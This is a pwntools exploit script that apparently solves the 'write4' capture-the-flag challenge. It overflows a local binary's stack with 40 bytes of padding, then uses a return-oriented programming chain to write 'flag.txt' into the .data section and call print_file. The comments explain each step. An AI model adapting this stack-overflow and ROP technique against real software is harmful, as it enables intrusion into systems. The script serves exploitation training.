# Useful command: pwndbg> disass usefulGadgets

from pwn import *

elf = context.binary = ELF('./write4', checksec=False)
context.log_level='debug'

io = process()


### To know which pop gadgets to use, first we need to find the mov gadget's pointer to see which register
### it is pointing into. In this case, it is pointing to r14

# mov <location_to_write>, <value_to_write>



pop_r14_r15 = 0x0400690 		# pop r14; pop r15; ret;
mov_r14 = 0x0400628				# mov qword ptr [r14], r15; ret;
data = 0x00601028				# .data section that is writable that we want to write (rabin2 -S write4)
pop_rdi = 0x400693				# Register to load arguments


# This time no need split bcs .data size is bigger and can fit the whole string

arg =  b'flag.txt'

payload = flat(
	b'A' * 40,
	pop_r14_r15,				# Pop location to write (data) into r14 register
	data,			
	arg,
	mov_r14,					# Takes arg as argument and writes at the location pointed by r14 (data location)
	pop_rdi,	
	data,						# Load data argument into rdi that has been written to 'flag.txt'
	elf.plt['print_file']		# Call function
)

io.sendline(payload)
io.interactive()

### FLOW: 	1) Prepare the where and what to write
###			2) Load arguments
###			3) Call function